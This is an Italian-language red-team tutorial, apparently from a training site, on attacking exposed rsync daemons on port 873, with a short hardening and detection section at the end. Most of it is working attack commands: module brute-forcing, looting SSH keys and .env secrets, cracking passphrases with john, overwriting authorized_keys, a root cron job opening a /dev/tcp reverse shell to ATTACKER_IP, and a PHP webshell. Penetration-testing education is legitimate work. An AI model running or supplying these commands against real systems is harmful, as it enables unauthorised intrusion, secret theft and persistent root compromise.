---
title: 'Rsync Exploit Red Team: Enumerazione, Privilege Escalation e RCE su Porta 873'
slug: rsync
description: >-
  Rsync è un potente strumento per sincronizzare e trasferire file da terminale.
  Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
image: /rsync.webp
draft: false
date: 2026-01-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - rsync
  - ''
featured: true
---

# Rsync Exploit Red Team: Enumerazione, Privilege Escalation e RCE su Porta 873

**Se la porta 873 è aperta, non stai guardando un semplice servizio di backup.** Stai guardando una potenziale autostrada per l'esfiltrazione dati, il movimento laterale e, in configurazioni vulnerabili, l'esecuzione di codice remota (RCE). Questa guida red team avanzata mostra la catena di sfruttamento completa, da una semplice enumerazione alla compromissione totale.

## TL;DR Operativo (Flusso a Step)

1. **Scan Rapido**: `nmap -p 873 --open -T4 <RETE>` per trovare host con rsync esposto.
2. **Enum Moduli**: `rsync <IP>::` per listare le condivisioni (moduli). Se fallisce, brute-force con nomi comuni (`backup`, `conf`, `deploy`).
3. **Triage Silenzioso**: `rsync -av --list-only rsync://<IP>/<MODULO>/` per esplorare contenuti senza scaricare. Cerca `.env`, `.sql`, `.pem`, `.ssh/`.
4. **Loot Mirato**: Scarica solo file ad alto valore con filtri `--include`/`--exclude`. Analizza SUBITO `.env` per segreti e prova ogni chiave SSH (`id_rsa`).
5. **Verifica Scrittura**: Testa se un modulo è scrivibile con un file innocuo. Se lo è, valuta vettori di RCE: sovrascrittura di `authorized_keys`, script in `/etc/cron.d/`, o webshell in webroot.
6. **Pivot/Post-Exploit**: Usa rsync via SSH (con credenziali/chiavi trovate) per muoverti lateralmente o esfiltrare dati da reti interne.

## Introduzione: Perché Rsync è un Vettore Critico

Rsync è uno strumento di sincronizzazione file estremamente efficiente. Nella sicurezza offensiva, è rilevante perché spesso risiede su server di **backup**, **deploy** o **storage**, dove transitano asset critici: configurazioni applicative, dump di database, chiavi SSH, certificati SSL e codice sorgente.

Trovare il demone `rsyncd` in ascolto sulla **porta TCP/873** è un segnale da investigare immediatamente. Una configurazione anche lievemente errata può esporre dati sensibili o, nei casi più gravi, fornire un percorso diretto per la compromissione del sistema.

**Nota Etica Fondamentale**: Le tecniche descritte sono per **lab autorizzati** (HTB, Proving Grounds, VM dedicate), **penetration test con scope scritto**, o sistemi di tua proprietà. L'abuso non autorizzato è illegale.

## Fase 1: Ricognizione e Fingerprinting Aggressivo

Approccio chirurgico. Niente scan rumorosi e generalisti.

```bash
# 1. Scoperta rapida nella subnet: chi ha la 873 aperta?
nmap -p 873 --open -T4 10.10.10.0/24 -oG rsync_hosts.txt
grep open rsync_hosts.txt | cut -d" " -f2

# 2. Fingerprinting del target specifico. -sV è utile per la versione (CVE check).
nmap -sV -sC -p 873 10.10.10.10
```

**Cosa Cercare Nell'Output**: `rsync` in ascolto, eventuale banner con numero di versione (es. `3.1.2`). Versioni obsolete possono avere vulnerabilità note (es. CVE-2017-16548).

## Fase 2: Enumerazione dei Moduli (La Mappa del Tesoro)

Il demone rsync organizza le directory condivise in "moduli". Enumerarli è il primo passo.

```bash
# Prova ad elencare i moduli senza autenticazione.
rsync 10.10.10.10::
```

**Output di esempio (golden ticket)**:

```
backup           Backup dei server
conf             File di configurazione
deploy           Directory di deploy applicativo
```

**Interpretazione**: Nomi come `backup`, `conf`, `deploy`, `www` sono indicatori fortissimi di dati sensibili.

**Se la Lista è Negata (`@ERROR: access denied`)**:
Non arrenderti. Il listing può essere disabilitato ma i moduli possono essere ancora accessibili. Fai un brute-force di nomi comuni.

```bash
# Esempio con un semplice loop
for module in backup conf data www storage sync deploy projects; do
    echo "TESTING: $module";
    rsync --list-only rsync://10.10.10.10/$module/ 2>/dev/null && echo "[+] Found: $module";
done
```

## Fase 3: Triage con `--list-only` e Sfruttamento Chiavi SSH

Prima di scaricare terabyte di log, esplora in modo stealth.

```bash
rsync -av --list-only rsync://10.10.10.10/backup/
```

**Output di esempio**:

```
drwxr-xr-x        4096 2023/10/26 .
-rw-r--r--    15482201 2023/10/25 application.tar.gz
-rw-------         600 2023/10/26 .env.production
-rw-r--r--       32768 2023/10/24 database.sql.gz
drwx------        4096 2023/10/26 .ssh
-rw--------        1679 2023/10/26 .ssh/id_rsa
-rw-r--r--         394 2023/10/26 .ssh/id_rsa.pub
```

**Priorità Assoluta 1: La Chiave SSH (`id_rsa`)**. Questo è un jackpot.

### Flusso Operativo per lo Sfruttamento di una Chiave SSH

**1. Recupero e Preparazione**:

```bash
rsync -av rsync://10.10.10.10/backup/.ssh/id_rsa ./loot/target_rsa
chmod 600 ./loot/target_rsa  # SSH rifiuta permessi troppo larghi
```

**2. Prova di Connessione Diretta**:

```bash
# Prova utenti comuni. L'utente è spesso deducibile dal percorso del modulo o da altri file.
ssh -i ./loot/target_rsa ubuntu@10.10.10.10
ssh -i ./loot/target_rsa deploy@10.10.10.10
ssh -i ./loot/target_rsa root@10.10.10.10  # Meno comune, ma prova sempre
```

**3. Se la Chiave è Protetta da Passphrase**:

```bash
# Tenta di crackarla con john
ssh2john ./loot/target_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Spiegazione del Riutilizzo (Credential Spreading)**: In ambienti reali, le chiavi SSH vengono spesso riutilizzate su più server per automatizzare backup, deploy o accessi. Una chiave trovata su un server di backup può aprire le porte a server di produzione, jumpbox, o repository di codice.

**Priorità Assoluta 2: File di Configurazione (`.env`, `*.config`, `*.yml`)**. Contengono quasi sempre segreti: password di database, chiavi API, token di servizi cloud.

```bash
# Scarica e analizza immediatamente
rsync -av rsync://10.10.10.10/backup/.env.production ./loot/
grep -i "pass\|key\|secret\|token\|url" ./loot/.env.production
```

## Fase 4: Loot Mirato ed Exfiltration Stealth

Organizza il loot e minimizza il rumore di rete.

```bash
# 1. Struttura ordinata per host e modulo
mkdir -p loot/10.10.10.10/rsync_backup

# 2. Whitelist: scarica SOLO ciò che ha valore
rsync -av \
  --include="*/" \
  --include=".env*" --include="*.config" --include="*.yml" --include="*.yaml" --include="*.json" \
  --include="*.sql*" --include="*.dump" \
  --include="id_rsa*" --include="*.pem" --include="*.key" --include="*.crt" \
  --exclude="*" \
  rsync://10.10.10.10/backup/ ./loot/10.10.10.10/rsync_backup/

# 3. (Opzionale) Controllo del rumore e volume
rsync -av --bwlimit=1000 --max-size=50M rsync://10.10.10.10/backup/large_logs/ ./loot/
```

## Fase 5: Abuso Avanzato e Percorso verso RCE

Se un modulo è **scrivibile**, la superficie d'attacco esplode. L'enumerazione diventa exploit.

### 1. Verifica Sicura della Scrittura

```bash
echo "test_$(date)" > /tmp/rsync_test.txt
rsync -av /tmp/rsync_test.txt rsync://10.10.10.10/deploy_upload/
# Se non da errore, il percorso è scrivibile.
```

### 2. Vettori di Exploit Concreti per RCE

**RCE via `authorized_keys` Overwrite (Accesso Immediato)**:

```bash
# Genera una nuova coppia di chiavi
ssh-keygen -f ./loot/attacker_key -N ""
# Sovrascrivi o crea il file authorized_keys dell'utente remoto
rsync -av ./loot/attacker_key.pub rsync://10.10.10.10/home_backup/user/.ssh/authorized_keys
# Connettiti
ssh -i ./loot/attacker_key user@10.10.10.10
```

**Impatto**: Shell immediata e persistente come quell'utente.

**RCE via Sovrascrittura Cron/Systemd (Esecuzione come Root)**:

```bash
# Crea un payload per cron che esegue una reverse shell
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > /tmp/evil_cron
# Caricalo se il modulo mappa /etc/cron.d/ o una directory genitore
rsync -av /tmp/evil_cron rsync://10.10.10.10/system_backup/etc/cron.d/exploit
```

**Impatto**: Esecuzione di codice come root al prossimo minuto.

**RCE via File di Deploy/Webroot (Webshell)**:

```bash
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
rsync -av shell.php rsync://10.10.10.10/web/uploads/
# Esegui comandi via browser o curl
curl "http://10.10.10.10/uploads/shell.php?cmd=id"
```

**Impatto**: Esecuzione di comandi remoti tramite il server web.

## Errori Comuni che Vedo Negli Assessment Reali

1. **Backup di File `.env` in Chiaro**: Il classico errore fatale. Espone password di database, chiavi API, secret di ogni genere.
2. **`rsyncd` Esposto su Internet senza `auth users`**: Configurazione in `rsyncd.conf` senza autenticazione o con `hosts allow = 0.0.0.0/0`. Invito aperto al mondo.
3. **Moduli con `read only = no` Innecessario**: Abilitare la scrittura per comodità, dimenticando il rischio di sovrascrittura di file critici.
4. **Path del Modulo che Punta a Root (`/`) o `/etc`**: Errore gravissimo. Espone l'intero filesystem o le sue parti più sensibili.
5. **Listing Pubblico (`list = true`) per Moduli Sensibili**: Fornisce gratuitamente la mappa dei dati più interessanti (`backup`, `conf`).

## Hardening & Detection: La Visione del Blue Team

Un red teamer efficace sa cosa cercherebbe un difensore.

### Indicatori di Compromissione (IoC) Pratici

**Log di `rsyncd`** (`/var/log/rsyncd.log`):

```
2024-01-15 03:14:15 [12345] recv FILES: .env.production, id_rsa
2024-01-15 03:14:20 [12345] sent 45.6K bytes  total size 45.6K
```

Un trasferimento notturno di `.env` e `id_rsa` da un IP non autorizzato è un **IoC chiarissimo**.

**Network Monitoring**:

* Connessioni in entrata sulla **porta 873** da IP non appartenenti ai client di backup noti.
* Picchi di traffico in uscita dalla 873 verso IP esterni (exfiltration).

**File Integrity Monitoring (FIM)**:

* Alterazioni in directory esportate come read-only.
* Creazione di file sospetti (`authorized_keys`, nuovi script in `/etc/cron.d/`).

### Checklist di Hardening Definitiva

1. **Principio del Minimo Privilegio**: Se non necessario, **disabilita `rsyncd`**. Usa rsync over SSH.
2. **Firewall e Segmentazione**: Limita l'accesso alla **873/TCP** solo agli IP dei client di backup.
3. **Configurazione `rsyncd.conf` Forte**:
   * `read only = yes` (se non serve scrivere).
   * `list = false` (nascondi i moduli).
   * `auth users = ...` e `secrets file = ...` (file con permessi 600).
   * `hosts allow = <IP-client-backup>`.
   * `uid = nobody`, `gid = nogroup`.
4. **Isolamento e Cifratura**:
   * I percorsi esportati devono essere **directory dedicate**, non root del FS.
   * **Cifrare** i dati sensibili nei backup. Mai backup di chiavi SSH in chiaro.

## CTA Finale: Passa dalla Teoria alla Pratica Muscolare

Hai visto la catena: da una porta 873 a una chiave SSH, fino alla RCE. La differenza tra uno script kiddie e un red teamer sta nella capacità di eseguire questo flusso su scenari complessi e multi-step.

**Mettiti alla prova con uno scenario reale** progettato per la nostra community:

1. Trova il demone rsync esposto.
2. Enumera e recupera una chiave SSH da un backup configurato male.
3. Usala per pivotare su un segmento di rete interno.
4. Sfrutta un modulo rsync scrivibile per ottenere RCE su un server critico.

Questo lab avanzato fa parte dei nostri **percorsi Red Team Ops**. **[Unisciti a HackITA](https://hackita.it/iscrizione)** per accedere a questo e altri lab realistici, walkthrough video dettagliati e sessioni di mentorship per cementare le tue skill operative.

Per le aziende: i nostri **Assessment Red Team su misura** partono proprio da esposizioni apparentemente "minori" come un rsync mal configurato per mappare l'intera catena di kill dell'infrastruttura. **[Richiedi una consulenza](https://hackita.it/servizi)**.
